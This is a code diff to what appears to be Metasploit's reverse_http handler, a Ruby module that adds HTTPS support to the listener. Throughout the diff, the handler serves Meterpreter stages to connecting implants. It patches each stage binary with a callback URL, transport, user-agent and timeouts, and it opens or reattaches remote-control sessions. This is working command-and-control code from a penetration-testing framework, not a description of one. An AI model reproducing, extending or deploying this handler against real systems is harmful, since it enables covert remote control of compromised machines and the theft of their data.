@@ -15,8 +15,7 @@ module ReverseHttp
 	include Msf::Handler
 
 	#
-	# Returns the string representation of the handler type, in this case
-	# 'reverse_http'.
+	# Returns the string representation of the handler type
 	#
 	def self.handler_type
 		return "reverse_http"
@@ -41,13 +40,66 @@ module ReverseHttp
 	#
 	# Precalculated checkums as fallback
 	#
-	URI_CHECKSUM_PRECALC = ["Zjjaq", "pIlfv", "UvoxP", "sqnx9", "zvoVO", "Pajqy", "7ziuw", "vecYp", "yfHsn", "YLzzp", "cEzvr", "abmri", "9tvwr", "vTarp", "ocrgc", "mZcyl", "xfcje", "nihqa", "40F17", "zzTWt", "E3192", "wygVh", "pbqij", "rxdVs", "ajtsf", "wvuOh", "hwRwr", "pUots", "rvzoK", "vUwby", "tLzyk", "zxbuV", "niaoy", "ukxtU", "vznoU", "zuxyC", "ymvag", "Jxtxw", "404KC", "DE563", "0A7G9", "yorYv", "zzuqP", "czhwo", "949N8", "a1560", "5A2S3", "Q652A", "KR201", "uixtg", "U0K02", "4EO56", "H88H4", "5M8E6", "zudkx", "ywlsh", "luqmy", "09S4I", "L0GG0", "V916E", "KFI11", "A4BN8", "C3E2Q", "UN804", "E75HG", "622eB", "1OZ71", "kynyx", "0RE7F", "F8CR2", "1Q2EM", "txzjw", "5KD1S", "GLR40", "11BbD", "MR8B2", "X4V55", "W994P", "13d2T", "6J4AZ", "HD2EM", "766bL", "8S4MF", "MBX39", "UJI57", "eIA51", "9CZN2", "WH6AA", "a6BF9", "8B1Gg", "J2N6Z", "144Kw", "7E37v", "9I7RR", "PE6MF", "K0c4M", "LR3IF", "38p3S", "39ab3", "O0dO1", "k8H8A", "0Fz3B", "o1PE1", "h7OI0", "C1COb", "bMC6A", "8fU4C", "3IMSO", "8DbFH", "2YfG5", "bEQ1E", "MU6NI", "UCENE", "WBc0E", "T1ATX", "tBL0A", "UGPV2", "j3CLI", "7FXp1", "yN07I", "YE6k9", "KTMHE", "a7VBJ", "0Uq3R", "70Ebn", "H2PqB", "83edJ", "0w5q2", "72djI", "wA5CQ", "KF0Ix", "i7AZH", "M9tU5", "Hs3RE", "F9m1i", "7ecBF", "zS31W", "lUe21", "IvCS5", "j97nC", "CNtR5", "1g8gV", "7KwNG", "DB7hj", "ORFr7", "GCnUD", "K58jp", "5lKo8", "GPIdP", "oMIFJ", "2xYb1", "LQQPY", "FGQlN", "l5COf", "dA3Tn", "v9RWC", "VuAGI", "3vIr9", "aO3zA", "CIfx5", "Gk6Uc", "pxL94", "rKYJB", "TXAFp", "XEOGq", "aBOiJ", "qp6EJ", "YGbq4", "dR8Rh", "g0SVi", "iMr6L", "HMaIl", "yOY1Z", "UXr5Y", "PJdz6", "OQdt7", "EmZ1s", "aLIVe", "cIeo2", "mTTNP", "eVKy5", "hf5Co", "gFHzG", "VhTWN", "DvAWf", "RgFJp", "MoaXE", "Mrq4W", "hRQAp", "hAzYA", "oOSWV", "UKMme", "oP0Zw", "Mxd6b", "RsRCh", "dlk7Q", "YU6zf", "VPDjq", "ygERO", "dZZcL", "dq5qM", "LITku", "AZIxn", "bVwPL", "jGvZK", "XayKP", "rTYVY", "Vo2ph", "dwJYR", "rLTlS", "BmsfJ", "Dyv1o", "j9Hvs", "w0wVa", "iDnBy", "uKEgk", "uosI8", "2yjuO", "HiOue", "qYi4t", "7nalj", "ENekz", "rxca0", "rrePF", "cXmtD", "Xlr2y", "S7uxk", "wJqaP", "KmYyZ", "cPryG", "kYcwH", "FtDut", "xm1em", "IaymY", "fr6ew", "ixDSs", "YigPs", "PqwBs", "y2rkf", "vwaTM", "aq7wp", "fzc4z", "AyzmQ", "epJbr", "culLd", "CVtnz", "tPjPx", "nfry8", "Nkpif", "8kuzg", "zXvz8", "oVQly", "1vpnw", "jqaYh", "2tztj", "4tslx"]
+	URI_CHECKSUM_PRECALC = [
+		"Zjjaq", "pIlfv", "UvoxP", "sqnx9", "zvoVO", "Pajqy", "7ziuw", "vecYp", "yfHsn", "YLzzp",
+		"cEzvr", "abmri", "9tvwr", "vTarp", "ocrgc", "mZcyl", "xfcje", "nihqa", "40F17", "zzTWt",
+		"E3192", "wygVh", "pbqij", "rxdVs", "ajtsf", "wvuOh", "hwRwr", "pUots", "rvzoK", "vUwby",
+		"tLzyk", "zxbuV", "niaoy", "ukxtU", "vznoU", "zuxyC", "ymvag", "Jxtxw", "404KC", "DE563",
+		"0A7G9", "yorYv", "zzuqP", "czhwo", "949N8", "a1560", "5A2S3", "Q652A", "KR201", "uixtg",
+		"U0K02", "4EO56", "H88H4", "5M8E6", "zudkx", "ywlsh", "luqmy", "09S4I", "L0GG0", "V916E",
+		"KFI11", "A4BN8", "C3E2Q", "UN804", "E75HG", "622eB", "1OZ71", "kynyx", "0RE7F", "F8CR2",
+		"1Q2EM", "txzjw", "5KD1S", "GLR40", "11BbD", "MR8B2", "X4V55", "W994P", "13d2T", "6J4AZ",
+		"HD2EM", "766bL", "8S4MF", "MBX39", "UJI57", "eIA51", "9CZN2", "WH6AA", "a6BF9", "8B1Gg",
+		"J2N6Z", "144Kw", "7E37v", "9I7RR", "PE6MF", "K0c4M", "LR3IF", "38p3S", "39ab3", "O0dO1",
+		"k8H8A", "0Fz3B", "o1PE1", "h7OI0", "C1COb", "bMC6A", "8fU4C", "3IMSO", "8DbFH", "2YfG5",
+		"bEQ1E", "MU6NI", "UCENE", "WBc0E", "T1ATX", "tBL0A", "UGPV2", "j3CLI", "7FXp1", "yN07I",
+		"YE6k9", "KTMHE", "a7VBJ", "0Uq3R", "70Ebn", "H2PqB", "83edJ", "0w5q2", "72djI", "wA5CQ",
+		"KF0Ix", "i7AZH", "M9tU5", "Hs3RE", "F9m1i", "7ecBF", "zS31W", "lUe21", "IvCS5", "j97nC",
+		"CNtR5", "1g8gV", "7KwNG", "DB7hj", "ORFr7", "GCnUD", "K58jp", "5lKo8", "GPIdP", "oMIFJ",
+		"2xYb1", "LQQPY", "FGQlN", "l5COf", "dA3Tn", "v9RWC", "VuAGI", "3vIr9", "aO3zA", "CIfx5",
+		"Gk6Uc", "pxL94", "rKYJB", "TXAFp", "XEOGq", "aBOiJ", "qp6EJ", "YGbq4", "dR8Rh", "g0SVi",
+		"iMr6L", "HMaIl", "yOY1Z", "UXr5Y", "PJdz6", "OQdt7", "EmZ1s", "aLIVe", "cIeo2", "mTTNP",
+		"eVKy5", "hf5Co", "gFHzG", "VhTWN", "DvAWf", "RgFJp", "MoaXE", "Mrq4W", "hRQAp", "hAzYA",
+		"oOSWV", "UKMme", "oP0Zw", "Mxd6b", "RsRCh", "dlk7Q", "YU6zf", "VPDjq", "ygERO", "dZZcL",
+		"dq5qM", "LITku", "AZIxn", "bVwPL", "jGvZK", "XayKP", "rTYVY", "Vo2ph", "dwJYR", "rLTlS",
+		"BmsfJ", "Dyv1o", "j9Hvs", "w0wVa", "iDnBy", "uKEgk", "uosI8", "2yjuO", "HiOue", "qYi4t",
+		"7nalj", "ENekz", "rxca0", "rrePF", "cXmtD", "Xlr2y", "S7uxk", "wJqaP", "KmYyZ", "cPryG",
+		"kYcwH", "FtDut", "xm1em", "IaymY", "fr6ew", "ixDSs", "YigPs", "PqwBs", "y2rkf", "vwaTM",
+		"aq7wp", "fzc4z", "AyzmQ", "epJbr", "culLd", "CVtnz", "tPjPx", "nfry8", "Nkpif", "8kuzg",
+		"zXvz8", "oVQly", "1vpnw", "jqaYh", "2tztj", "4tslx"
+	]
+
+	#
+	# Use the +refname+ to determine whether this handler uses SSL or not
+	#
+	def ssl?
+		!!(self.refname.index("https"))
+	end
+
+	#
+	# Return a URI of the form scheme://host:port/
+	#
+	# Scheme is one of http or https and host is properly wrapped in [] for ipv6
+	# addresses.
+	#
+	def full_uri
+		lhost = datastore['LHOST']
+		if lhost.empty? or lhost == "0.0.0.0" or lhost == "::"
+			lhost = Rex::Socket.source_address
+		end
+		lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
+		scheme = (ssl?) ? "https" : "http"
+		uri = "#{scheme}://#{lhost}:#{datastore["LPORT"]}/"
+
+		uri
+	end
 
 	#
 	# Map "random" URIs to static strings, allowing us to randomize
 	# the URI sent in the first request.
 	#
 	def process_uri_resource(uri_match)
+
 		# This allows 'random' strings to be used as markers for
 		# the INIT and CONN request types, based on a checksum
 		uri_strip, uri_conn = uri_match.split('_', 2)
@@ -92,7 +144,7 @@ module ReverseHttp
 		register_options(
 			[
 				OptString.new('LHOST', [ true, "The local listener hostname" ]),
-				OptPort.new('LPORT', [ true, "The local listener port", 8443 ])
+				OptPort.new('LPORT', [ true, "The local listener port", 8080 ])
 			], Msf::Handler::ReverseHttp)
 
 		register_advanced_options(
@@ -113,7 +165,7 @@ module ReverseHttp
 	end
 
 	#
-	# Create a HTTP listener
+	# Create an HTTP listener
 	#
 	def setup_handler
 
@@ -128,14 +180,15 @@ module ReverseHttp
 		self.service = Rex::ServiceManager.start(Rex::Proto::Http::Server,
 			datastore['LPORT'].to_i,
 			ipv6 ? '::' : '0.0.0.0',
-			false,
+			ssl?,
 			{
 				'Msf'        => framework,
 				'MsfExploit' => self,
 			},
-			comm
+			comm,
+			(ssl?) ? datastore["SSLCert"] : nil
 		)
-		
+
 		self.service.server_name = datastore['MeterpreterServerName']
 
 		# Create a reference to ourselves
@@ -148,8 +201,7 @@ module ReverseHttp
 			},
 			'VirtualDirectory' => true)
 
-		self.conn_ids = []
-		print_status("Started HTTP reverse handler on http://#{datastore['LHOST']}:#{datastore['LPORT']}/")
+		print_status("Started HTTP#{ssl? ? "S" : ""} reverse handler on #{full_uri}")
 	end
 
 	#
@@ -175,7 +227,6 @@ module ReverseHttp
 	end
 
 	attr_accessor :service # :nodoc:
-	attr_accessor :conn_ids
 
 protected
 
@@ -188,26 +239,13 @@ protected
 
 		print_status("#{cli.peerhost}:#{cli.peerport} Request received for #{req.relative_resource}...")
 
-
-		lhost = datastore['LHOST']
-
-		# Default to our own IP if the user specified 0.0.0.0 (pebkac avoidance)
-		if lhost.empty? or lhost == '0.0.0.0'
-			lhost = Rex::Socket.source_address(cli.peerhost)
-		end
-
-		lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
-
 		uri_match = process_uri_resource(req.relative_resource)
 
 		# Process the requested resource.
 		case uri_match
 			when /^\/INITJM/
-				print_line("Java: #{req.relative_resource}")
-
 				conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
-				url = "http://#{lhost}:#{datastore['LPORT']}/" + conn_id + "/\x00"
-				print_line "URL: #{url.inspect}"
+				url = full_uri + conn_id + "/\x00"
 
 				blob = ""
 				blob << obj.generate_stage
@@ -222,7 +260,6 @@ protected
 				blob << [packet.length+8, 0].pack('NN') + packet
 
 				resp.body = blob
-				conn_ids << conn_id
 
 				# Short-circuit the payload's handle_connection processing for create_session
 				create_session(cli, {
@@ -231,11 +268,10 @@ protected
 					:url                => url,
 					:expiration         => datastore['SessionExpirationTimeout'].to_i,
 					:comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
-					:ssl                => false
+					:ssl                => ssl?
 				})
 
 			when /^\/A?INITM?/
-				print_line("Win32: #{req.relative_resource}")
 
 				url = ''
 
@@ -251,11 +287,11 @@ protected
 					blob[i, str.length] = str
 					print_status("Patched user-agent at offset #{i}...")
 				end
-				
+
 				# Replace the transport string first (TRANSPORT_SOCKET_SSL)
 				i = blob.index("METERPRETER_TRANSPORT_SSL")
 				if i
-					str = "METERPRETER_TRANSPORT_HTTP\x00"
+					str = "METERPRETER_TRANSPORT_HTTP#{ssl? ? "S" : ""}\x00"
 					blob[i, str.length] = str
 				end
 				print_status("Patched transport at offset #{i}...")
@@ -263,7 +299,7 @@ protected
 				conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
 				i = blob.index("https://" + ("X" * 256))
 				if i
-					url = "http://#{lhost}:#{datastore['LPORT']}/" + conn_id + "/\x00"
+					url = full_uri + conn_id + "/\x00"
 					blob[i, url.length] = url
 				end
 				print_status("Patched URL at offset #{i}...")
@@ -275,7 +311,6 @@ protected
 				end
 				print_status("Patched Expiration Timeout at offset #{i}...")
 
-
 				i = blob.index([0xaf79257f].pack("V"))
 				if i
 					str = [ datastore['SessionCommunicationTimeout'] ].pack("V")
@@ -285,8 +320,6 @@ protected
 
 				resp.body = blob
 
-				conn_ids << conn_id
-
 				# Short-circuit the payload's handle_connection processing for create_session
 				create_session(cli, {
 					:passive_dispatcher => obj.service,
@@ -294,27 +327,26 @@ protected
 					:url                => url,
 					:expiration         => datastore['SessionExpirationTimeout'].to_i,
 					:comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
-					:ssl                => false
+					:ssl                => ssl?,
 				})
-			when /^\/(CONN_.*)\//
+
+			when /^\/CONN_.*\//
 				resp.body = ""
-				conn_id = $1
-				print_line("Received poll from #{conn_id}")
+				# Grab the checksummed version of CONN from the payload's request.
+				conn_id = req.relative_resource.gsub("/", "")
 
-				if not self.conn_ids.include?(conn_id)
-					print_status("Incoming orphaned session #{conn_id}, reattaching...")
-					conn_ids << conn_id
+				print_status("Incoming orphaned session #{conn_id}, reattaching...")
 
-					# Short-circuit the payload's handle_connection processing for create_session
-					create_session(cli, {
-						:passive_dispatcher => obj.service,
-						:conn_id            => conn_id,
-						:url                => url,
-						:expiration         => datastore['SessionExpirationTimeout'].to_i,
-						:comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
-						:ssl                => false
-					})
-				end
+				# Short-circuit the payload's handle_connection processing for create_session
+				create_session(cli, {
+					:passive_dispatcher => obj.service,
+					:conn_id            => conn_id,
+					:url                => full_uri + conn_id + "/\x00",
+					:expiration         => datastore['SessionExpirationTimeout'].to_i,
+					:comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
+					:ssl                => ssl?,
+				})
+
 			else
 				print_status("#{cli.peerhost}:#{cli.peerport} Unknown request to #{uri_match} #{req.inspect}...")
 				resp.code    = 200
@@ -333,3 +365,4 @@ end
 
 end
 end
+
